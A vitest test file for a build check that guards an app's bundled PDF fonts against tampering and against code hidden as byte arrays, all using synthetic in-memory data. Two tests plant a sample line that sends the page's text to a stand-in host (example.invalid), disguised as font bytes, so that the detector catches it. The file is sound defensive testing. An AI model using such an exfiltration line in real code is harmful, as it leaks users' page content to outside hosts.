// Self-test for the font checks of the build check (scripts/font-rules.mjs):
// in-memory synthetic "fonts" and bundles, with planted problems that must
// each be reported. No real file is read or modified.
import { describe, expect, it } from 'vitest';
import {
  checkFontChunkLoadedAtStartup,
  checkNumberArrays,
  checkSourceFonts,
  FONT_CHUNK_MAX_OTHER_TEXT,
  FONT_CHUNK_PATTERN,
  findNumberArrays,
  isBytesImportAllowed,
  isFontFile,
  NUMBER_ARRAY_MIN_LENGTH,
  PDF_FONT_FILES,
  sha256Hex,
} from './font-rules.mjs';

/** Synthetic font bytes (not a real font): `length` bytes from `seed`. */
const fakeFont = (seed: number, length = 300): Uint8Array => Uint8Array.from({ length }, (_, i) => (seed + i * 7) % 256);

const fontA = fakeFont(1);
const fontB = fakeFont(2, 200);
const fonts = [
  { file: 'src/fonts/A.woff', sha256: sha256Hex(fontA) },
  { file: 'src/fonts/B.woff', sha256: sha256Hex(fontB) },
];

/** The shape the build gives the font chunk. */
const chunkText = (...arrays: Uint8Array[]): string =>
  `${arrays.map((a, i) => `var v${i}=new Uint8Array([${a.join(',')}]);`).join('')}export{v0 as a,v1 as b};`;

const CHUNK = 'assets/pdf-fonts-AbC_12-x.js';
const ENTRY = 'assets/index-Xy9.js';

describe('findNumberArrays', () => {
  const run = (n: number): string => Array.from({ length: n }, (_, i) => i % 256).join(',');

  it('finds a run of at least the threshold, with its line and values', () => {
    const found = findNumberArrays(`let a=1;\nx=[${run(NUMBER_ARRAY_MIN_LENGTH)}];`);
    expect(found).toHaveLength(1);
    expect(found[0]?.line).toBe(2);
    expect(found[0]?.values).toHaveLength(NUMBER_ARRAY_MIN_LENGTH);
    expect(found[0]?.values.slice(0, 3)).toEqual([0, 1, 2]);
  });

  it('uses a threshold of 64 and ignores shorter runs', () => {
    expect(NUMBER_ARRAY_MIN_LENGTH).toBe(64);
    expect(findNumberArrays(`x=[${run(63)}]`)).toEqual([]);
  });

  it('counts hex literals and spaces after commas', () => {
    const text = `x=[${Array.from({ length: 70 }, (_, i) => (i % 2 ? `0x${i.toString(16)}` : String(i))).join(', ')}]`;
    const found = findNumberArrays(text);
    expect(found).toHaveLength(1);
    expect(found[0]?.values[1]).toBe(1);
  });

  // Every way JavaScript can write a number must still count as a number.
  const forms: [string, (i: number) => string, number][] = [
    ['negatives', (i) => `-${i}`, -5],
    ['alternating signs', (i) => (i % 2 ? `-${i}` : String(i)), -5],
    ['unary plus', (i) => `+${i}`, 5],
    ['floats', (i) => `${i}.0`, 5],
    ['fractions', (i) => `${i}.5`, 5.5],
    ['leading-dot fractions', (i) => `.${i + 1}`, 0.6],
    ['exponents', (i) => `${i}e0`, 5],
    ['signed exponents', (i) => `${i * 10}E-1`, 5],
    ['hex', (i) => `0x${i.toString(16)}`, 5],
    ['binary', (i) => `0b${i.toString(2)}`, 5],
    ['octal', (i) => `0o${i.toString(8)}`, 5],
    ['BigInt', (i) => `${i}n`, 5],
    ['negative hex BigInt', (i) => `-0X${i.toString(16)}n`, -5],
    ['numeric separators', (i) => `1_0${i}`, 105],
  ];
  for (const [name, write, fifth] of forms) {
    it(`counts ${name}`, () => {
      const found = findNumberArrays(`x=[${Array.from({ length: 70 }, (_, i) => write(i)).join(',')}]`);
      expect(found).toHaveLength(1);
      expect(found[0]?.values).toHaveLength(70);
      expect(found[0]?.values[5]).toBe(fifth);
    });
  }

  it('counts holes ([a,,b]) as items that are not numbers', () => {
    const found = findNumberArrays(`x=[${Array.from({ length: 70 }, (_, i) => (i % 3 ? '' : String(i))).join(',')}]`);
    expect(found).toHaveLength(1);
    expect(found[0]?.values).toHaveLength(70);
    expect(found[0]?.values[0]).toBe(0);
    expect(found[0]?.values[1]).toBeNaN();
  });

  it('does not count digits inside names, and ignores ordinary code', () => {
    const names = Array.from({ length: 100 }, (_, i) => `a${i}`).join(',');
    expect(findNumberArrays(`f(${names})`)).toEqual([]);
    expect(findNumberArrays('function a(b,c){return b+c}var d=a(1,2),e=[3,4,5];'.repeat(3000))).toEqual([]);
  });

  it('finds a planted array even inside a string (e.g. inlined worker code)', () => {
    expect(findNumberArrays(`const w="self.x=[${run(100)}];";`)).toHaveLength(1);
  });
});

describe('checkNumberArrays', () => {
  const good = [
    { path: ENTRY, text: 'import{a as e,b as t}from"./pdf-fonts-AbC_12-x.js";console.log(1);' },
    { path: CHUNK, text: chunkText(fontA, fontB) },
    { path: 'THIRD_PARTY_NOTICES.txt', text: 'license text' },
  ];

  it('accepts a font chunk holding exactly the committed fonts', () => {
    expect(FONT_CHUNK_PATTERN.test(CHUNK)).toBe(true);
    expect(checkNumberArrays(good, fonts)).toEqual([]);
  });

  it('rejects a long number array planted in any other file', () => {
    const planted = [...good.slice(1), { path: ENTRY, text: `${good[0]?.text ?? ''}\nvar p=[${fontA.join(',')}];` }];
    const problems = checkNumberArrays(planted, fonts);
    expect(problems).toHaveLength(1);
    expect(problems[0]).toMatch(/^dist\/assets\/index-Xy9\.js:2: a 300-number array outside the font chunk/);
  });

  it('rejects a font array copied outside the chunk even if it matches a font', () => {
    const copied = [...good, { path: 'assets/other.js', text: `x=[${fontB.join(',')}]` }];
    expect(checkNumberArrays(copied, fonts)).toHaveLength(1);
  });

  it('rejects a modified font (one byte changed) in the chunk', () => {
    const modified = Uint8Array.from(fontA);
    modified[150] = (modified[150] ?? 0) ^ 1;
    const problems = checkNumberArrays([{ path: CHUNK, text: chunkText(modified, fontB) }], fonts);
    expect(problems.some((p) => p.includes('matches no committed font'))).toBe(true);
    expect(problems.some((p) => p.includes('src/fonts/A.woff must be in the font chunk exactly once, found 0'))).toBe(true);
  });

  it('rejects code hidden as a byte array in the chunk', () => {
    const code = new TextEncoder().encode('fetch("https://example.invalid/"+document.body.textContent)'.repeat(3));
    const problems = checkNumberArrays([{ path: CHUNK, text: chunkText(fontA, fontB, code) }], fonts);
    expect(problems).toHaveLength(1);
    expect(problems[0]).toMatch(/matches no committed font/);
  });

  it('rejects values that are not bytes', () => {
    const big = Array.from({ length: 100 }, (_, i) => i * 10).join(',');
    const problems = checkNumberArrays([{ path: CHUNK, text: `${chunkText(fontA, fontB)}var z=[${big}];` }], fonts);
    expect(problems).toEqual([expect.stringMatching(/values that are not bytes/)]);
  });

  it('rejects ~120 negative numbers that would fit in the "other text" budget', () => {
    const negatives = Array.from({ length: 120 }, (_, i) => -(i % 100)).join(',');
    expect(negatives.length).toBeLessThan(FONT_CHUNK_MAX_OTHER_TEXT);
    const problems = checkNumberArrays([{ path: CHUNK, text: `${chunkText(fontA, fontB)}var z=[${negatives}];` }], fonts);
    expect(problems).toEqual([expect.stringMatching(/values that are not bytes/)]);
  });

  it('rejects other number forms and holes in the chunk unless they are exactly a font', () => {
    const code = Array.from(new TextEncoder().encode('fetch("https://example.invalid/")'.repeat(3)));
    for (const items of [code.map((b) => `${b}.0`), code.map((b) => `0x${b.toString(16)}n`), code.map((b, i) => (i % 2 ? '' : String(b)))]) {
      const problems = checkNumberArrays([{ path: CHUNK, text: `${chunkText(fontA, fontB)}var z=[${items.join(',')}];` }], fonts);
      expect(problems).toHaveLength(1);
      expect(problems[0]).toMatch(/matches no committed font|values that are not bytes/);
    }
  });

  it('rejects a missing or a duplicated font', () => {
    expect(checkNumberArrays([{ path: CHUNK, text: chunkText(fontA) }], fonts)).toEqual([
      expect.stringMatching(/src\/fonts\/B\.woff must be in the font chunk exactly once, found 0/),
    ]);
    expect(checkNumberArrays([{ path: CHUNK, text: chunkText(fontA, fontB, fontB) }], fonts)).toEqual([
      expect.stringMatching(/src\/fonts\/B\.woff must be in the font chunk exactly once, found 2/),
    ]);
  });

  it('rejects zero or two font chunks', () => {
    expect(checkNumberArrays([good[0]!], fonts)).toEqual([expect.stringMatching(/exactly one font chunk.*found 0/)]);
    const two = [...good, { path: 'assets/pdf-fonts-second.js', text: chunkText(fontA, fontB) }];
    expect(checkNumberArrays(two, fonts)).toContainEqual(expect.stringMatching(/exactly one font chunk.*found 2/));
  });

  it('rejects code in the font chunk beyond a small wrapper', () => {
    const extra = 'x'.repeat(FONT_CHUNK_MAX_OTHER_TEXT);
    const problems = checkNumberArrays([{ path: CHUNK, text: `${chunkText(fontA, fontB)}${extra}` }], fonts);
    expect(problems).toEqual([expect.stringMatching(/characters besides the font arrays/)]);
  });

  it('does not treat look-alike names as the font chunk', () => {
    for (const path of ['pdf-fonts-a.js', 'assets/sub/pdf-fonts-a.js', 'assets/pdf-fonts-a.js.map', 'assets/xpdf-fonts-a.js']) {
      expect(FONT_CHUNK_PATTERN.test(path), path).toBe(false);
    }
  });
});

describe('checkFontChunkLoadedAtStartup', () => {
  const html = `<head><script type="module" crossorigin src="/${ENTRY}"></script></head>`;
  const files = (entryText: string) => [
    { path: ENTRY, text: entryText },
    { path: CHUNK, text: chunkText(fontA, fontB) },
  ];

  it('accepts a static import from the entry script', () => {
    expect(checkFontChunkLoadedAtStartup(html, files('import{a as e,b as t}from"./pdf-fonts-AbC_12-x.js";e;'))).toEqual([]);
    expect(checkFontChunkLoadedAtStartup(html, files('import "./pdf-fonts-AbC_12-x.js";'))).toEqual([]);
  });

  it('rejects a dynamic import (loaded later, which needs the network)', () => {
    const problems = checkFontChunkLoadedAtStartup(html, files('const f=()=>import("./pdf-fonts-AbC_12-x.js");'));
    expect(problems).toEqual([expect.stringMatching(/does not statically import dist\/assets\/pdf-fonts-AbC_12-x\.js/)]);
  });

  it('rejects an entry that does not import the font chunk, or a missing entry', () => {
    expect(checkFontChunkLoadedAtStartup(html, files('console.log(1);'))).toHaveLength(1);
    expect(checkFontChunkLoadedAtStartup('<head></head>', files(''))).toEqual([expect.stringMatching(/no entry/)]);
  });
});

describe('checkSourceFonts', () => {
  it('accepts the exact committed files', () => {
    expect(checkSourceFonts([{ path: 'src/fonts/A.woff', bytes: fontA }, { path: 'src/fonts/B.woff', bytes: fontB }], fonts)).toEqual([]);
  });

  it('rejects a modified, an unlisted or a missing font file', () => {
    const modified = Uint8Array.from(fontA);
    modified[0] = 0;
    expect(checkSourceFonts([{ path: 'src/fonts/A.woff', bytes: modified }, { path: 'src/fonts/B.woff', bytes: fontB }], fonts)).toEqual([
      expect.stringMatching(/^src\/fonts\/A\.woff: SHA-256 .* must not be modified/),
    ]);
    expect(
      checkSourceFonts(
        [{ path: 'src/fonts/A.woff', bytes: fontA }, { path: 'src/fonts/B.woff', bytes: fontB }, { path: 'src/ui/x.ttf', bytes: fontA }],
        fonts,
      ),
    ).toEqual([expect.stringMatching(/^src\/ui\/x\.ttf: font file not listed/)]);
    expect(checkSourceFonts([{ path: 'src/fonts/A.woff', bytes: fontA }], fonts)).toEqual([expect.stringMatching(/B\.woff: font file is missing/)]);
  });

  it('rejects a pinned font file in the wrong folder, even with the right bytes', () => {
    const files = [
      { path: 'src/fonts/A.woff', bytes: fontA },
      { path: 'src/fonts/B.woff', bytes: fontB },
      { path: 'src/ui/B.woff', bytes: fontB },
    ];
    expect(checkSourceFonts(files, fonts)).toEqual([expect.stringMatching(/^src\/ui\/B\.woff: font file not listed/)]);
    const real = PDF_FONT_FILES.map((f) => ({ path: f.file, bytes: new Uint8Array(0) }));
    const moved = real.map((f) => (f.path === 'src/fonts/IBMPlexSans-Bold.woff' ? { ...f, path: 'src/ui/IBMPlexSans-Bold.woff' } : f));
    const problems = checkSourceFonts(moved);
    expect(problems).toContainEqual(expect.stringMatching(/^src\/ui\/IBMPlexSans-Bold\.woff: font file not listed/));
    expect(problems).toContainEqual(expect.stringMatching(/^src\/fonts\/IBMPlexSans-Bold\.woff: font file is missing/));
  });

  it('recognises font file names', () => {
    for (const path of ['a.woff', 'a.WOFF2', 'a.ttf', 'a.otf', 'a.eot']) expect(isFontFile(path), path).toBe(true);
    for (const path of ['a.ts', 'LICENSE.txt', 'a.woff.ts']) expect(isFontFile(path), path).toBe(false);
  });
});

describe('isBytesImportAllowed (the ?bytes plugin of vite.config.ts)', () => {
  it('accepts a .woff file directly in the project src/fonts/ folder (POSIX and Windows)', () => {
    expect(isBytesImportAllowed('/home/dev/proj/src/fonts/A.woff', '/home/dev/proj/src/fonts/')).toBe(true);
    expect(isBytesImportAllowed('/home/dev/proj/src/fonts/A.woff', '/home/dev/proj/src/fonts')).toBe(true);
    expect(isBytesImportAllowed('D:\\proj\\src\\fonts\\A.woff', 'D:/proj/src/fonts/')).toBe(true);
    expect(isBytesImportAllowed('d:/proj/src/fonts/A.woff', 'D:/proj/src/fonts/')).toBe(true);
  });

  it('rejects other folders, other projects, sub-folders and other file types', () => {
    const dir = '/home/dev/proj/src/fonts/';
    for (const file of [
      '/home/dev/proj/node_modules/x/src/fonts/A.woff',
      '/home/dev/other/src/fonts/A.woff',
      '/home/dev/proj/src/fonts-x/A.woff',
      '/home/dev/proj/src/fonts/sub/A.woff',
      '/home/dev/proj/src/fonts/../ui/A.woff',
      '/home/dev/proj/src/fonts/A.woff2',
      '/home/dev/proj/src/fonts/A.ttf',
      '/home/dev/proj/src/ui/A.woff',
    ]) {
      expect(isBytesImportAllowed(file, dir), file).toBe(false);
    }
  });
});

describe('the pinned fonts', () => {
  it('are the four official IBM Plex files, with the SHA-256 of the official release', () => {
    expect(PDF_FONT_FILES).toEqual([
      { file: 'src/fonts/IBMPlexSans-Regular.woff', sha256: 'b731cf56514a4bd711ab2f9acf641f9311707f4386772eb306d25c2b29b73b1a' },
      { file: 'src/fonts/IBMPlexSans-Bold.woff', sha256: '5c8bcd6be12df67acd529819b92f36febeff4df059a9603c4ecd578f01cf4062' },
      { file: 'src/fonts/IBMPlexSans-Italic.woff', sha256: 'ed06e0a2cfa973492c7ee61e5f1bf3be7db4d3d5c1551c889ec458ba2972db99' },
      { file: 'src/fonts/IBMPlexMono-Regular.woff', sha256: '3a0d6e1587e8dc784be5a75e1c55b1a5533919b04072a29c750bb29cfe4a4b74' },
    ]);
  });
});
